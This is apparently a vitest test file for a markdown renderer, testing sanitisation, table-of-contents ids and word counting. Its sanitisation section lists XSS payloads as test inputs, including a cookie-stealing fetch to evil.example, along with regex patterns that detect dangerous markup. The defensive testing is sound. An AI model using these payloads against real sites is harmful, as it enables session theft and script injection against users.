import { describe, expect, it } from "vitest";
import { countWords, renderMarkdown } from "./markdown";

/**
 * The render pipeline is the application's only XSS surface (Part 8.4). These
 * tests are the security boundary: if sanitisation ever moves after the trusted
 * steps, or an allow-list widens, these fail.
 */
describe("sanitisation", () => {
  const payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="https://evil.example"></iframe>',
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    '<div style="background:url(javascript:alert(1))">styled</div>',
    "<script>fetch('https://evil.example?c='+document.cookie)</script>",
    '<a href="data:text/html,<script>alert(1)</script>">data</a>',
    '<form action="https://evil.example"><input name="password"></form>',
    '<object data="evil.swf"></object>',
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<style>body{display:none}</style>",
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
  ];

  for (const payload of payloads) {
    it(`neutralises ${payload.slice(0, 52)}`, () => {
      const { html } = renderMarkdown(`${payload}\n\nA normal paragraph.`);

      // The dangerous construct must not survive in any form.
      expect(html).not.toMatch(/<script/i);
      expect(html).not.toMatch(/<iframe/i);
      expect(html).not.toMatch(/<object/i);
      expect(html).not.toMatch(/<embed/i);
      expect(html).not.toMatch(/<style/i);
      expect(html).not.toMatch(/<link/i);
      expect(html).not.toMatch(/<base/i);
      expect(html).not.toMatch(/<meta/i);
      expect(html).not.toMatch(/<form/i);
      expect(html).not.toMatch(/<svg/i);
      expect(html).not.toMatch(/javascript:/i);
      expect(html).not.toMatch(/data:text\/html/i);
      expect(html).not.toMatch(/\son[a-z]+\s*=/i);
      expect(html).not.toMatch(/evil\.example/);
    });
  }

  it("drops raw HTML rather than escaping it into the document", () => {
    const { html } = renderMarkdown("Before\n\n<script>alert(1)</script>\n\nAfter");
    // remark-rehype without allowDangerousHtml discards the node entirely.
    expect(html).toContain("Before");
    expect(html).toContain("After");
  });

  it("keeps the surrounding legitimate content when a payload is present", () => {
    const { html } = renderMarkdown(
      "# Title\n\nA paragraph with a <script>alert(1)</script> payload inside it.\n\nAnother paragraph.",
    );
    expect(html).toContain("Another paragraph");
    expect(html).not.toMatch(/<script/i);
  });

  it("strips event handlers written as markdown links", () => {
    const { html } = renderMarkdown("[click](javascript:alert(1))");
    expect(html).not.toMatch(/javascript:/i);
  });
});

describe("sanitised output is well-formed", () => {
  it("keeps headings, lists, code and tables", () => {
    const { html } = renderMarkdown(
      [
        "## A heading",
        "",
        "A paragraph.",
        "",
        "- first",
        "- second",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
      ].join("\n"),
    );

    expect(html).toContain("<h2");
    expect(html).toContain("<ul>");
    expect(html).toContain("<li>first</li>");
    expect(html).toContain("<pre>");
    expect(html).toContain("<table>");
    expect(html).toContain("<td>1</td>");
  });

  it("allows only the URL schemes a technical topic legitimately needs", () => {
    const { html } = renderMarkdown(
      "[an external source](https://example.org) and [a mail link](mailto:someone@example.org)",
    );
    expect(html).toContain('href="https://example.org"');
    expect(html).toContain('href="mailto:someone@example.org"');
  });
});

describe("table of contents", () => {
  it("collects h2 and h3 with ids that match the rendered anchors", () => {
    const markdown = [
      "## First section",
      "",
      "Text.",
      "",
      "### A subsection",
      "",
      "More text.",
      "",
      "## Second section",
    ].join("\n");

    const { html, tableOfContents } = renderMarkdown(markdown);

    expect(tableOfContents).toHaveLength(3);
    expect(tableOfContents[0]).toMatchObject({ text: "First section", depth: 2 });
    expect(tableOfContents[1]).toMatchObject({ text: "A subsection", depth: 3 });

    // Every TOC id must exist in the output, or the rail links to nothing.
    for (const entry of tableOfContents) {
      expect(html).toContain(`id="${entry.id}"`);
    }
  });

  it("ignores h1 because the article title is already rendered above it", () => {
    const { tableOfContents } = renderMarkdown("# The title\n\n## A section");
    expect(tableOfContents).toHaveLength(1);
  });

  it("produces a stable id for a heading containing punctuation and accents", () => {
    const first = renderMarkdown("## Profit & loss: what it really means").tableOfContents;
    const second = renderMarkdown("## Profit & loss: what it really means").tableOfContents;
    expect(first[0]?.id).toBe(second[0]?.id);
    expect(first[0]?.id).toMatch(/^[a-z0-9-]+$/);
  });

  it("disambiguates two headings with the same text", () => {
    const { tableOfContents } = renderMarkdown("## Risk\n\ntext\n\n## Risk\n");
    expect(tableOfContents[0]?.id).not.toBe(tableOfContents[1]?.id);
  });

  it("returns an empty list for content with no headings", () => {
    expect(renderMarkdown("Just a paragraph.").tableOfContents).toEqual([]);
  });

  it("adds a non-focusable, aria-hidden anchor rather than a tab stop per heading", () => {
    const { html } = renderMarkdown("## A section");
    // Visible affordance only. Navigation lives in the table of contents, so a
    // keyboard user meets one mechanism instead of a stop at every heading.
    // `aria-hidden` serialises in its boolean form, which is valid and correct.
    expect(html).toMatch(/aria-hidden/);
    expect(html).toMatch(/tabindex="-1"/);
    expect(html).toMatch(/class="heading-anchor"/);
  });

  it("keeps the anchor glyph out of the table-of-contents text", () => {
    // A collector and a renderer that disagree is a bug that reads as a typo in
    // the navigation rail, so it is pinned directly.
    const { tableOfContents } = renderMarkdown("## Risk and return");
    expect(tableOfContents[0]?.text).toBe("Risk and return");
  });
});

describe("word counting", () => {
  it("counts words in prose", () => {
    expect(countWords("one two three four")).toBe(4);
  });

  it("ignores headings, fenced code and inline code", () => {
    expect(countWords("# A heading\n\nBody text here.")).toBe(3);
    expect(countWords("Intro.\n\n```js\nconst a = 1;\nconst b = 2;\n```")).toBe(1);
    // Inline code is removed entirely, so the code token does not inflate the count.
    expect(countWords("Use `const` for constants.")).toBe(3);
  });

  it("counts link text without the URL", () => {
    expect(countWords("See the [guidance note](https://example.org/very/long/path) here.")).toBe(5);
  });

  it("returns zero for empty input rather than one", () => {
    expect(countWords("")).toBe(0);
    expect(countWords("   \n\n  ")).toBe(0);
  });
});
